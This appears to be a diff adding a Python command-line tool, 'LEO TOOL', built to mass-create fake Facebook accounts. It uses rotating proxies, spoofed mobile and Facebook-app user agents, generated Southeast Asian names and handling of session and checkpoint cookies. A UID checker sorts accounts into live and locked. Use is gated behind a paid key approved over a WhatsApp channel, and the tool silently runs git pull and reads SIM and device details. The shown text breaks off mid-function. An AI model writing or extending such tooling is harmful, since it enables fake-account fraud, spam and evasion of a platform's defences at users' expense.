+                sys.executable,
+                "-m",
+                "pip",
+                "install",
+                "--quiet",
+                pkg,
+                "--break-system-packages",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+    sys.stdout.write(
+        "\r\033[1;32m[{0}] \033[1;37m100% - \033[1;32mAll modules installed!\033[0m\n".format(
+            "█" * bar_len
+        )
+    )
+    time.sleep(1)
+    os.system("clear")
+
+
+auto_install()
+
+# ------------------[ IMPORT ]-------------------#
+import re, json, string, hashlib, random, platform
+import requests
+import bs4
+import faker
+import fake_email
+from faker import Faker
+from bs4 import BeautifulSoup
+from bs4 import BeautifulSoup as parse
+from bs4 import BeautifulSoup as par
+
+
+# ------------------[ PROXY SERVER ]-------------------#
+def load_proxies():
+    proxy_url = [
+        "https://raw.githubusercontent.com/chandtricker/HTTP/main/http.txt",
+        "https://raw.githubusercontent.com/chandtricker/HTTP/main/http_proxies.txt",
+    ]
+    try:
+        response = requests.get(proxy_url)
+        if response.status_code == 200:
+            return [proxy.strip() for proxy in response.text.splitlines()]
+    except requests.exceptions.RequestException:
+        pass
+    return []
+
+
+proxies_list = load_proxies()
+
+
+def get_random_proxy():
+    if proxies_list:
+        return {"http": random.choice(proxies_list)}
+    return None
+
+
+proxies = get_random_proxy()
+# ------------------[ COLORS ]-------------------#
+gggg = "\033[8;102m"  # green new coverage prices
+rrrr = "\033[8;101m"  # silver new cover words
+rrrrrrrr = "\033[32;101m"  # yes you are right
+q = "\033[1;30m"  # Gray
+w = "\033[1;31m"  # red
+e = "\033[1;32m"  # green
+r = "\033[1;33m"  # yellow
+t = "\033[1;34m"  # blue
+y = "\033[1;35m"  # rosy
+u = "\033[1;36m"  # Open blue
+i = "\033[1;37m"  # white
+P = "\x1b[1;97m"  #
+M = "\033[1;33m"  #
+H = "\033[1;32m"  #
+K = "\x1b[1;97m"  #
+B = "\x1b[1;96m"  #
+U = "\x1b[1;95m"  #
+O = "\x1b[1;97m"  #
+R = "\x1b[38;5;246m"  #
+N = "\x1b[0m"  #
+my_color = [P, M, H, K, B, U, O, N, R]
+ssn = requests.Session()
+boos = random.choice([P, M, H, K, B, U, O, N, R])
+orange = "\x1b[38;5;196m"
+yellow = "\x1b[38;5;208m"
+black = "\033[1;30m"
+red = "\x1b[38;5;160m"
+green = "\x1b[38;5;46m"
+yelloww = "\033[1;33m"
+blue = "\033[38;5;6m"
+purple = "\033[1;35m"
+cyan = "\033[1;36m"
+white = "\033[1;37m"
+faltu = "\033[1;47m"
+pvt = "\033[1;0m"
+gren = "\x1b[38;5;154m"
+gas = "\033[1;32m"
+abir = random.choice(
+    [
+        "\x1b[38;5;196m",
+        "\x1b[38;5;208m",
+        "\033[1;30m",
+        "\x1b[38;5;160m",
+        "\x1b[38;5;46m",
+        "\033[1;33m",
+        "\033[38;5;6m",
+        "\033[1;35m",
+        "\033[1;36m",
+        "\033[1;37m",
+    ]
+)
+my_color = [white, blue, green]
+warna = random.choice(my_color)
+# ------------------[ USER AGENT UA ]-------------------#
+from fake_useragent import UserAgent
+
+ua = UserAgent()
+
+
+def generate_user_agent():
+    android_versions = ["9", "10", "11", "12", "13"]
+    devices = [
+        "Infinix X682C",
+        "Redmi Note 9 Pro",
+        "V2111 Build/SP1A.210812.003",
+        "HLK-AL00 Build/HONORHLK-AL00",
+        "ASUS_Z01QD",
+        "Redmi 4A Build/MMB29M",
+    ]
+    browser_engines = [
+        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
+        "AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/",
+    ]
+    browsers = ["Mobile Safari/537.36", "UCBrowser/11.4.8.1012 Mobile Safari/537.36"]
+    aa = "Mozilla/5.0 (Linux; Android"
+    b = random.choice(android_versions)
+    c = random.choice(devices)
+    d = random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
+    e = random.randint(1, 999)
+    f = random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
+    g = random.choice(browser_engines)
+    h = random.randint(80, 114)
+    i = "0"
+    j = random.randint(4200, 5900)
+    k = random.randint(40, 150)
+    l = random.choice(browsers)
+    return f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
+
+
+def W_ueragent():
+    chrome_versions = [(80, 3987, 163), (90, 4430, 212), (100, 4896, 127)]
+    webkit_versions = [(537, 36), (537, 36), (537, 36)]
+    safari_versions = [500, 600]
+    windows_versions = [(10, 0), (10, 1), (11, 0)]
+    chrome_version = random.choice(chrome_versions)
+    webkit_version = random.choice(webkit_versions)
+    safari_version = random.choice(safari_versions)
+    windows_version = random.choice(windows_versions)
+    is_win64 = random.choice([True, False])
+    win64_str = "Win64; x64" if is_win64 else "WOW64"
+    user_agent = (
+        f"Mozilla/5.0 (Windows NT {windows_version[0]}.{windows_version[1]}; {win64_str}) "
+        f"AppleWebKit/{webkit_version[0]}.{webkit_version[1]} (KHTML, like Gecko) "
+        f"Chrome/{chrome_version[0]}.{chrome_version[1]}.{chrome_version[2]} Safari/{safari_version}"
+    )
+    return user_agent
+
+
+def user_agent():
+    devices = [
+        "[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 9 Pro;FBSV/10]",
+        "[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287519012;FBDM/{density=2.75,width=1080,height=2134};FBLC/cs_CZ;FBRV/289140577;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/10]",
+        "[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1931;FBSV/10]",
+        "[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162189;FBDM/{density=3.0,width=1080,height=2165};FBLC/it_IT;FBRV/526139383;FBCR/TIM;FBMF/OnePlus;FBBD/OnePlus;FBDV/LE2113;FBSV/13]",
+        "[FBAN/FB4A;FBAV/221.0.0.48.102;FBBV/154683427;FBDM/{density=2.75,width=1080,height=2030};FBLC/en_GB;FBRV/155327069;FBCR/Banglalink;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 5;FBSV/8.1.0]",
+    ]
+    prefix = (
+        "[FBAN/FB4A;FBAV/"
+        + str(random.randint(11, 80))
+        + ".0.0."
+        + str(random.randint(9, 49))
+        + "."
+        + str(random.randint(11, 77))
+        + ";FBBV/"
+        + str(random.randint(11111111, 99999999))
+        + ";"
+    )
+    ua = prefix + random.choice(devices)
+    return ua
+
+
+# ------------------[ FAKE NAME PHILIPPINES ]-------------------#
+def fake_philippines():
+    first = Faker("en_PH").first_name()
+    last = Faker("en_PH").last_name()
+    return first, last
+
+
+# ------------------[ FAKE NAME INDONESIA ]-------------------#
+def fake_indonesia():
+    first = Faker("id_ID").first_name()
+    last = Faker("id_ID").last_name()
+    return first, last
+
+
+# ------------------[ FAKE NAME VIETNAMESE ]-------------------#
+def fake_vietnamese():
+    first = Faker("vi_VN").first_name()
+    last = Faker("vi_VN").last_name()
+    return first, last
+
+
+# ------------------[ DATA EXTRACTOR ]-------------------#
+def extractor(data):
+    try:
+        soup = BeautifulSoup(data, "html.parser")
+        data = {}
+        for inputs in soup.find_all("input"):
+            name = inputs.get("name")
+            value = inputs.get("value")
+            if name:
+                data[name] = value
+        return data
+    except Exception as e:
+        return {"error": str(e)}
+
+
+# ------------------[ LOCKED/ACTIVE CHECKER ]-------------------#
+def lock_checker(uid):
+    try:
+        response = requests.get(f"https://graph.facebook.com/{uid}/picture?type=normal")
+        if "Photoshop" in response.text:
+            return "Active"
+        else:
+            return "Locked"
+    except Exception as e:
+        pass
+        return "Error"
+
+
+# ------------------[ RANDOM STRING ]-------------------#
+def generate_random_string(length):
+    return "".join(random.choices(string.ascii_letters + string.digits, k=length))
+
+
+# Save to sdcard on Android
+folder_path = "/sdcard/AUTO_CREATE_LEO"
+if not os.path.exists("/sdcard/"):
+    folder_path = "AUTO_CREATE_LEO"
+try:
+    os.makedirs(folder_path, exist_ok=True)
+except:
+    pass
+# ------------------[ INFORMATION ]-------------------#
+try:
+    ___sim___ = (
+        subprocess.check_output("getprop gsm.operator.alpha", shell=True)
+        .decode("utf-8")
+        .replace("\n", "")
+        .replace(",", "|")
+    )
+except:
+    ___sim___ = "Unknown"
+
+try:
+    ___brand___ = (
+        subprocess.check_output("getprop ro.product.brand", shell=True)
+        .decode("utf-8")
+        .replace("\n", "")
+    )
+except:
+    ___brand___ = "Termux"
+
+___bit___ = platform.architecture()[0]
+
+try:
+    ___ccc___ = requests.get("http://ip-api.com/json/").json()["country"]
+except:
+    ___ccc___ = "Unknown"
+
+
+# ------------------[ ??? ]-------------------#
+def p(x):
+    print(x)
+
+
+# ------------------[ SLOW PRINT ]-------------------#
+def sp(text):
+    for char in text:
+        print(char, end="", flush=True)
+        time.sleep(0.01)
+
+
+# ------------------[ CONNECTION MONITOR ]-------------------#
+# ------------------[ WHATSAPP CHANNEL ]-------------------#
+WHATSAPP_CHANNEL = "https://whatsapp.com/channel/0029Vb8CSZQIt5rolffFX31P"
+
+
+# ------------------[ APPROVAL ALERT ]-------------------#
+def approval_alert():
+    os.system("clear")
+    for _ in range(3):
+        print("\033[1;32m")
+        print("  ╔═══════════════════════════════════════════╗")
+        print("  ║     ✅  A P P R O V E D  ✅              ║")
+        print("  ║     ✅  A P P R O V E D  ✅              ║")
+        print("  ║     ✅  A P P R O V E D  ✅              ║")
+        print("  ╚═══════════════════════════════════════════╝")
+        print("\033[1;33m")
+        print("  ╔═══════════════════════════════════════════╗")
+        print("  ║   🔥 CONGRATULATIONS! APPROVED! 🔥      ║")
+        print("  ║   🔥 CONGRATULATIONS! APPROVED! 🔥      ║")
+        print("  ║   🔥 CONGRATULATIONS! APPROVED! 🔥      ║")
+        print("  ╚═══════════════════════════════════════════╝")
+        time.sleep(0.5)
+        os.system("clear")
+        time.sleep(0.3)
+    print("\033[1;32m")
+    print("  ╔═══════════════════════════════════════════╗")
+    print("  ║     ✅  A P P R O V E D  ✅              ║")
+    print("  ║━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━║")
+    print("  ║  🔥 CONGRATULATIONS! APPROVED! 🔥       ║")
+    print("  ║━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━║")
+    print("  ║  ✅ Access Granted! Enjoy the Tool!     ║")
+    print("  ╚═══════════════════════════════════════════╝")
+    print("\033[1;37m")
+
+
+# ------------------[ APPROVAL SYSTEM ]-------------------#
+def approval():
+    os.system("clear")
+    print(logo2)
+    sp("\033[1;37m━▷ Welcome to LEO TOOL!")
+    time.sleep(2)
+
+    os.system("clear")
+    print(logo)
+
+    try:
+        os.system("git pull > /dev/null 2>&1")
+    except:
+        pass
+    time.sleep(1)
+
+    uuid = str(os.geteuid()) + "DS" + str(os.geteuid())
+    id = "MR-LEO-" + "".join(uuid)
+
+    sp("\033[1;39m━▷ You Get Approved for Using Command Paid Tool \033[1;37m")
+    print("\n\033[1;39m━▷ Your Key :\u001b[36m " + id)
+    time.sleep(0.1)
+    print(
+        """\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑◑\033[1;33m◑\033[1;34m◑\033[1;35m◑"""
+    )
+
+    try:
+        github_urls = [
+            "https://raw.githubusercontent.com/Leoafrica/Leo-sys/refs/heads/main/key.txt",
+            "https://raw.githubusercontent.com/chandtricker/HTTP/refs/heads/main/http.txt",
+            "https://raw.githubusercontent.com/chandtricker/HTTP/main/http_proxies.txt",
+        ]
+
+        approved = False
+        while not approved:
+            any_ok = False
+            for url in github_urls:
+                try:
+                    response = requests.get(url, timeout=10)
+                    any_ok = True
+                    if response.status_code == 200 and id in response.text:
+                        approved = True
+                        break
+                except:
+                    continue
+            if not approved and not any_ok:
+                wait_conn()
+            elif not approved:
+                break
+
+        if approved:
+            sp("\n\033[1;39m━▷ Congrats! You are approved successfully. Enjoy the tool!")
+            approval_alert()
+            time.sleep(2)
+            return True
+        else:
+            sp("\n\033[1;39m━▷ Your Key is not approved. Please contact Admin")
+            print(f"\n\033[1;33m━▷ Your Generated Key: \033[1;36m{id}")
+            time.sleep(0.1)
+
+            print("\n\033[1;31m━▷ To get approval:")
+            print("\033[1;32m1. Open WhatsApp Channel")
+            print("\033[1;32m2. Send your key in channel response")
+            print("\033[1;32m3. Admin will approve within 24 hours")
+
+            choice = input(
+                '\n\033[1;33mPress ENTER to open channel or type "exit" to quit: '
+            )
+            if choice.lower() == "exit":
+                exit("\033[1;32m━▷ Thanks for trying CHAND TOOL!")
+
+            print(f"\033[1;32m━▷ Opening WhatsApp Channel...")
+            print(f"\033[1;36m")
+            print(f"════════════════════════════════════════════════════")
+            print(f"   {WHATSAPP_CHANNEL} ")
+            print(f"════════════════════════════════════════════════════")
+            print(f"\033[1;37m")
+
+            opened = False
+            try:
+                import webbrowser
+
+                if webbrowser.open(WHATSAPP_CHANNEL):
+                    opened = True
+            except:
+                pass
+            if not opened:
+                try:
+                    subprocess.run(
+                        ["termux-open-url", WHATSAPP_CHANNEL],
+                        check=True,
+                        timeout=5,
+                        capture_output=True,
+                    )
+                    opened = True
+                except:
+                    pass
+            if not opened:
+                try:
+                    subprocess.run(
+                        ["xdg-open", WHATSAPP_CHANNEL],
+                        check=True,
+                        timeout=5,
+                        capture_output=True,
+                    )
+                    opened = True
+                except:
+                    pass
+            if not opened:
+                try:
+                    subprocess.run(
+                        [
+                            "am",
+                            "start",
+                            "-a",
+                            "android.intent.action.VIEW",
+                            "-d",
+                            WHATSAPP_CHANNEL,
+                        ],
+                        check=True,
+                        timeout=5,
+                        capture_output=True,
+                    )
+                    opened = True
+                except:
+                    pass
+
+            if opened:
+                print(f"\033[1;32m━▷ ✅ WhatsApp Channel opening in browser!")
+            else:
+                print(
+                    f"\033[1;33m━▷ ⚠️  Auto-open failed. Tap the link above or open manually"
+                )
+
+            print(f"\033[1;32m━▷ Send this key in channel response: \033[1;36m{id}")
+
+            input("\n\033[1;33mAfter getting approval, press ENTER to check again...")
+            return approval()
+
+    except Exception as e:
+        print(f"\033[1;31m━▷ Error checking approval: {e}")
+        print("\033[1;31m━▷ Please check your internet connection")
+        choice = input('\n\033[1;33mPress ENTER to retry or type "exit" to quit: ')
+        if choice.lower() == "exit":
+            exit("\033[1;32m━▷ Thanks for trying LEO TOOL!")
+        return approval()
+
+
+# ------------------------[ VERSION ]-----------------------#
+____Version____ = "\033[1;32mV/1.1"
+# ------------------[ LOGO ]-------------------#
+logo = f"""\033[1;37mWELCOME TO LEO COMMAND
+
+\033[1;30m
+                  ▉▉▉▉
+                 ▂▉▉▉▉▂
+                \033[1;33m╰▏ ┛┗ ▕╯
+                 ╲ 👅 ╱
+                 \033[1;32m╱▔╲╱▔╲
+               ╱ ╱▏╭╮▕╲ ╲
+               ╲ ╲▏╭╮▕╱ ╱       \033[1;31m╷  ╭─╴╭─╮
+                \033[1;35m ╲▉▉▉▉╱         \033[1;34m│  ├╴ │ │
+                \033[1;34m  ▏╭╮▕          \033[1;32m╰─╴╰─╴╰─╯ 
+                \033[1;34m  ▏▏▕▕
+                  ▏▏▕▕
+                \033[1;31m ╭╰ ╮╭╰ ╮
+               \033[1;39mTHE \033[1;35mKING \033[1;36mLEO
+\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+\033[0;92m
+\033[1;31m██╗     ███████╗ ██████╗ 
+\033[1;32m██║     ██╔════╝██╔═══██╗
+\033[1;33m██║     █████╗  ██║   ██║
+\033[1;34m██║     ██╔══╝  ██║   ██║
+\033[1;35m███████╗███████╗╚██████╔╝
+\033[1;36m╚══════╝╚══════╝ ╚═════╝ 
+
+\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR LEO 
+\033[1;39m━▷ \033[0;91m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mPAID
+\033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;37m1.0
+\033[1;39m━▷ \033[1;36mFEEL THE POWER OF LEO 
+\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+\033[1;39m━▷ LOCATION \033[1;39m◈✙◈ {___ccc___}
+\033[1;39m━▷ DEVICE   \033[1;39m◈✙◈ {___brand___}
+\033[1;39m━▷ BIT      \033[1;39m◈✙◈ {___bit___}
+\033[1;39m━▷ SIM SLOT \033[1;39m◈✙◈ {___sim___}
+\033[1;34m─────────────────────────────────────────────────────"""
+
+# ------------------[ LOGO2 ]-------------------#
+logo2 = """\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑◑\033[1;33m◑\033[1;34m◑\033[1;35m◑
+\033[1;37mWELCOME TO LEO COMMAND
+
+\033[1;31m╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗  
+║║║║╣ ║  ║  ║ ║║║║║╣   
+╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝  
+
+
+\033[1;32m╔╦╗╔═╗
+ ║ ║ ║
+ ╩ ╚═╝
+
+
+\033[1;33m╦  ╔═╗╔═╗
+║  ║╣ ║ ║
+╩═╝╚═╝╚═╝
+
+
+\033[1;35m╔╦╗╔═╗╔═╗╦  
+ ║ ║ ║║ ║║  
+ ╩ ╚═╝╚═╝╩═╝
+
+ \033[1;31mOWNER \033[1;32mTOOL \033[1;33mOF \033[1;37mMR \033[1;35mLEO 
+
+\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑◑\033[1;33m◑\033[1;34m◑\033[1;35m◑"""
+
+
+# ------------------[ LINEX ]-------------------#
+def linex():
+    print(f"\033[1;34m─────────────────────────────────────────────────────")
+
+
+# ------------------[ SYSTEM CLEAR ]-------------------#
+def clear():
+    os.system("clear")
+    print(logo)
+
+
+# ------------------[ LOOP ]-------------------#
+loop = 0
+lim = 0
+tp = 0
+cnt = 0
+ok = []
+cp = []
+cps = 0
+oks = 0
+died = 0
+live = 0
+uid = []
+
+
+# ------------------[ MENU CHAND ]-------------------#
+# ------------------[ CONNECTION WAIT ]-------------------#
+def wait_conn():
+    while True:
+        for i in range(60, 0, -1):
+            sys.stdout.write(f"\r\033[1;31m━▷ Connection Lost! Retrying in {i}s... \033[0m")
+            sys.stdout.flush()
+            time.sleep(1)
+            try:
+                requests.get("https://www.google.com", timeout=2)
+                sys.stdout.write("\r\033[K\033[1;32m━▷ Connected! Resuming...\033[0m\n")
+                return
+            except:
+                continue
+
+# ------------------[ YOUTUBE CHANNEL ]-------------------#
+YOUTUBE_CHANNEL = "https://whatsapp.com/channel/0029Vb8CSZQIt5rolffFX31P"
+
+def open_url(url):
+    try:
+        import webbrowser
+        if webbrowser.open(url):
+            return True
+    except:
+        pass
+    try:
+        subprocess.run(["termux-open-url", url], check=True, timeout=5, capture_output=True)
+        return True
+    except:
+        pass
+    try:
+        subprocess.run(["xdg-open", url], check=True, timeout=5, capture_output=True)
+        return True
+    except:
+        pass
+    try:
+        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", url], check=True, timeout=5, capture_output=True)
+        return True
+    except:
+        pass
+    return False
+
+# ------------------[ UID CHECKER ]-------------------#
+UID_FOLDER = "ALIVE-UID-LEO"
+
+def uid_checker():
+    clear()
+    print(" \033[1;32m[\033[1;31m–\033[1;32m] UID CHECKER")
+    linex()
+    path = input(" \033[1;32m[\033[1;31m–\033[1;32m] ENTER TXT FILE PATH : ").strip()
+    if not path:
+        print(" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mNO FILE SELECTED")
+        time.sleep(2)
+        menu()
+        return
+    try:
+        with open(path, "r") as f:
+            uids = [line.strip() for line in f if line.strip()]
+    except:
+        print(f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mFILE NOT FOUND: {path}")
+        time.sleep(2)
+        menu()
+        return
+    os.makedirs(UID_FOLDER, exist_ok=True)
+    live_path = os.path.join(UID_FOLDER, "LIVE-UID.txt")
+    death_path = os.path.join(UID_FOLDER, "DEATH-UID.txt")
+    live_count = 0
+    death_count = 0
+    total = len(uids)
+    print(f" \033[1;32m[\033[1;31m–\033[1;32m] TOTAL UIDS: \033[1;37m{total}")
+    linex()
+    for idx, uid in enumerate(uids, 1):
+        status = lock_checker(uid)
+        if status == "Active":
+            live_count += 1
+            sys.stdout.write(f"\r\033[1;32m[LIVE] {uid}                    \n")
+            sys.stdout.flush()
+            with open(live_path, "a") as f:
+                f.write(uid + "\n")
+        elif status == "Locked":
+            death_count += 1
+            sys.stdout.write(f"\r\033[1;31m[DEATH] {uid}                    \n")
+            sys.stdout.flush()
+            with open(death_path, "a") as f:
+                f.write(uid + "\n")
+        else:
+            sys.stdout.write(f"\r\033[1;33m[ERROR] {uid}                    \n")
+            sys.stdout.flush()
+    linex()
+    print(f" \033[1;32m[\033[1;31m–\033[1;32m] ✅ LIVE  : \033[1;32m{live_count}")
+    print(f" \033[1;32m[\033[1;31m–\033[1;32m] ❌ DEATH : \033[1;31m{death_count}")
+    print(f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;37mSAVED TO: {UID_FOLDER}/")
+    input("\n \033[1;33mPress ENTER to go back...")
+    menu()
+
+def menu():
+    clear()
+    print(" \033[1;32m[\033[1;31m1\033[1;32m] AUTO CREATE FB")
+    print(" \033[1;32m[\033[1;31m2\033[1;32m] UID CHECKER")
+    print(" \033[1;32m[\033[1;31m3\033[1;32m] SPREAD UID")
+    print(" \033[1;32m[\033[1;31m0\033[1;32m] EXIT ")
+    linex()
+    xd = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
+    if xd in ["1", "01"]:
+        print("\033[1;32m━▷ Opening YouTube Channel...\033[1;36m")
+        print(f"  {YOUTUBE_CHANNEL}")
+        open_url(YOUTUBE_CHANNEL)
+        time.sleep(1)
+        method()
+    elif xd in ["2", "02"]:
+        print("\033[1;32m━▷ Opening WhatsApp Channel...\033[1;36m")
+        print("  https://whatsapp.com/channel/0029Vb8CSZQIt5rolffFX31P")
+        open_url("https://whatsapp.com/channel/0029Vb8CSZQIt5rolffFX31P")
+        time.sleep(1)
+        uid_checker()
+    elif xd in ["3", "03"]:
+        auto_create_fb_method_3_()
+    elif xd in ["0", "00"]:
+        exit(" \033[1;32m[\033[1;31m–\033[1;32m] THANKS FOR USE ♥ ")
+    else:
+        print(
+            " \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mOPTION NOT FOUND IN MENU..."
+        )
+        time.sleep(1)
+        menu()
+
+
+# ------------------[ AUTO CREATE FACEBOOK METHOD ]-------------------#
+def method():
+    clear()
+    print(" \033[1;32m[\033[1;31m1\033[1;32m] METHOD 1")
+    print(" \033[1;32m[\033[1;31m2\033[1;32m] METHOD 2")
+    linex()
+    xd = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
+    if xd in ["1", "01"]:
+        auto_create_fb_method_1_()
+    elif xd in ["2", "02"]:
+        auto_create_fb_method_2_()
+
+
+# ------------------[ OKS AND CPS AND COOKIE ]-------------------#
+def cvt(st, ran):
+    try:
+        if st == "oks":
+            cookie = "c_user=%s;xs=%s;fr=%s;datr=%s;" % (
+                ran["c_user"],
+                ran["xs"],
+                ran["fr"],
+                ran["datr"],
+            )
+        elif st == "cps":
+            cookie = "checkpoint=%s;datr=%s;fr=%s;" % (
+                ran["checkpoint"],
+                ran["datr"],
+                ran["fr"],
+            )
+    except Exception as e:
+        cookie = "; ".join([str(x) + "=" + str(y) for x, y in ran])
+    return str(cookie)
+
+
+# ------------------[ METHOD 1 ]-------------------#
+def auto_create_fb_method_1_() -> None:
+    clear()
+    print(" \033[1;32m[\033[1;31m1\033[1;32m] NAME PHILIPPINE")
+    print(" \033[1;32m[\033[1;31m2\033[1;32m] NAME INDONESIA")
+    print(" \033[1;32m[\033[1;31m3\033[1;32m] NAME VIETNAMESE")
+    linex()
+    ethan_username = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
+    linex()
+    print(" \033[1;32m[\033[1;31m1\033[1;32m] AUTO PASSWORD")
+    print(" \033[1;32m[\033[1;31m2\033[1;32m] MANUAL PASSWORD")
+    linex()
+    ethan_password = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
+    linex()
+    if ethan_password in ["2", "02"]:
+        pasw2 = input(" \033[1;32m[\033[1;31m–\033[1;32m] ENTER CUSTOM PASSWORD : ")
+        linex()
+    clear()
+    print(" \033[1;32m[\033[1;31m–\033[1;32m] TOTAL UID  \033[1;33m: \033[1;37m50000")
+    print(
